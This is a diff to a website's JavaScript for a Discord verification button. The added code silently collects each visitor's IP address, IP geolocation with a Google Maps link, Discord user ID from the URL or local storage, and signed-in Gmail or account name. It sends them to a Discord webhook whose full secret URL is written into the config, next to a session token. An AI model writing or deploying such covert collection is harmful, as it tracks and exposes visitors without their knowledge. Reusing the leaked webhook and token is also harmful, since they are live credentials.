@@ -691,10 +691,76 @@
       guildId: "1537549121752141954",
       verifyBaseUrl: "https://verifierbot.xyz/verify",
       sessionToken: "abd8d2950920bc8b79cc241a",
-      verifyWebhookUrl: "ضع_هنا_رابط_WEBHOOK_الجديد_ديال_الروم_1575933649642066151",
+      verifyWebhookUrl: "https://discord.com/api/webhooks/1575948259464188055/c3iSqPHF0TkA89QyU8-gHe54TIJMmTi53wwdYp0QCjxy5kxpnY1fzs5CHoJsZS4fbmqA",
       verifyChannelUrl: "https://discord.com/channels/1537549121752141954/1575933649642066151",
       inviteUrl: "https://discord.gg/HeGbubVc5"
     };
+
+    let cachedIpLocationInfo = null;
+
+    async function fetchIpLocationDetails(ipAddress) {
+      if (cachedIpLocationInfo) return cachedIpLocationInfo;
+      const cleanIp = String(ipAddress || currentClientIp || "").trim();
+      const targetPath = cleanIp ? `https://ipwho.is/${encodeURIComponent(cleanIp)}` : "https://ipwho.is/";
+      try {
+        const res = await fetchWithTimeout(targetPath, { cache: "no-store" }, 3500);
+        if (res.ok) {
+          const data = await res.json();
+          if (data && data.success !== false) {
+            const parts = [data.city, data.region, data.country].filter(Boolean);
+            const addressLabel = parts.length ? parts.join(" - ") : "غير متوفر";
+            const mapUrl = (typeof data.latitude === "number" && typeof data.longitude === "number")
+              ? `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+              : "";
+            cachedIpLocationInfo = {
+              ip: data.ip || cleanIp || "غير متوفر",
+              address: addressLabel,
+              mapUrl: mapUrl
+            };
+            return cachedIpLocationInfo;
+          }
+        }
+      } catch (_) {}
+
+      return {
+        ip: cleanIp || "غير متوفر",
+        address: "غير متوفر",
+        mapUrl: ""
+      };
+    }
+
+    function detectDiscordUserId() {
+      try {
+        const params = new URLSearchParams(window.location.search);
+        const hashParams = new URLSearchParams((window.location.hash || "").replace(/^#/, ""));
+        const fromUrl = (
+          params.get("discord_id") ||
+          params.get("discordId") ||
+          params.get("user_id") ||
+          hashParams.get("discord_id") ||
+          hashParams.get("discordId") ||
+          ""
+        ).trim();
+        if (/^\d{15,21}$/.test(fromUrl)) return fromUrl;
+      } catch (_) {}
+
+      try {
+        const savedId = (localStorage.getItem("lhajmoha_discord_user_id") || sessionStorage.getItem("lhajmoha_discord_user_id") || "").trim();
+        if (/^\d{15,21}$/.test(savedId)) return savedId;
+      } catch (_) {}
+
+      return "?";
+    }
+
+    function detectConnectedAccountOrGmail() {
+      if (verifiedProblemAuth && verifiedProblemAuth.email) {
+        return verifiedProblemAuth.email;
+      }
+      if (activeChatMember && activeChatMember.fullName) {
+        return `${activeChatMember.fullName} (حساب الشات)`;
+      }
+      return "غير متوفر";
+    }
 
     function buildVerifierTargetUrl() {
       const channelUrl = (DISCORD_VERIFY_CONFIG.verifyChannelUrl || "").trim();
@@ -705,29 +771,43 @@
       return `${DISCORD_VERIFY_CONFIG.verifyBaseUrl}?guild=${guild}`;
     }
 
-    function sendDiscordVerifyWebhookLog(targetUrl) {
+    async function sendDiscordVerifyWebhookLog(targetUrl) {
       const webhookUrl = (DISCORD_VERIFY_CONFIG.verifyWebhookUrl || "").trim();
       if (!webhookUrl || webhookUrl.startsWith("ضع_هنا_")) return;
+
+      if (!currentClientIp) {
+        try { await Promise.race([fetchClientPublicIp(), new Promise(r => setTimeout(r, 1200))]); } catch (_) {}
+      }
+
+      const locInfo = await Promise.race([
+        fetchIpLocationDetails(currentClientIp),
+        new Promise(resolve => setTimeout(() => resolve({ ip: currentClientIp || "غير متوفر", address: "غير متوفر", mapUrl: "" }), 1800))
+      ]);
+
       const platInfo = getPlatformStyle(CURRENT_CLIENT_PLATFORM);
-      const memberLabel = (activeChatMember && activeChatMember.fullName)
-        ? activeChatMember.fullName
-        : (verifiedProblemAuth?.email || "زائر السيت");
+      const ipValue = locInfo.ip || currentClientIp || "غير متوفر";
+      const discordIdValue = detectDiscordUserId();
+      const accountOrGmailValue = detectConnectedAccountOrGmail();
+      const connectAddressValue = locInfo.mapUrl
+        ? `${locInfo.address} ([خريطة](${locInfo.mapUrl}))`
+        : (locInfo.address || "غير متوفر");
 
       postDiscordWebhook(
         webhookUrl,
         "🛡️ دخول مباشر إلى روم Verify من السيت",
         [
-          { name: "👤 المستخدم", value: memberLabel, inline: true },
+          { name: "🌐 IP", value: ipValue, inline: true },
+          { name: "🆔 Discord ID", value: discordIdValue, inline: true },
+          { name: "📧 Gmail / الحساب", value: accountOrGmailValue, inline: true },
+          { name: "📍 Adresse Connect", value: connectAddressValue, inline: false },
           { name: "📱 الجهاز", value: platInfo.label, inline: true },
-          { name: "🌐 IP", value: currentClientIp || "غير متوفر", inline: true },
-          { name: "🆔 Guild ID", value: DISCORD_VERIFY_CONFIG.guildId || "1537549121752141954", inline: true },
           { name: "📌 روم Verify", value: targetUrl, inline: false }
         ],
         0x5865f2
       );
     }
 
-    function handleDiscordVerifyRole() {
+    async function handleDiscordVerifyRole() {
       const statusBox = document.getElementById("discordVerifyStatus");
       const statusText = document.getElementById("discordVerifyStatusText");
       const targetUrl = buildVerifierTargetUrl();
@@ -737,7 +817,9 @@
         statusText.textContent = "جاري توجيهك نيشان إلى روم Verify في Discord...";
       }
 
-      sendDiscordVerifyWebhookLog(targetUrl);
+      try {
+        await sendDiscordVerifyWebhookLog(targetUrl);
+      } catch (_) {}
 
       if (/^https?:\/\//i.test(targetUrl)) {
         window.open(targetUrl, "_blank", "noopener,noreferrer");
@@ -2818,7 +2900,10 @@
       syncChatCloudWarning();
       syncChatMemberUi();
       updateChatInputAccess();
-      fetchClientPublicIp().finally(() => notifyDiscordVisitorEntered());
+      fetchClientPublicIp().finally(() => {
+        fetchIpLocationDetails(currentClientIp);
+        notifyDiscordVisitorEntered();
+      });
       syncProblemGmailUi();
       initGoogleSignInButton();
       syncRemoteProblemBannedList();
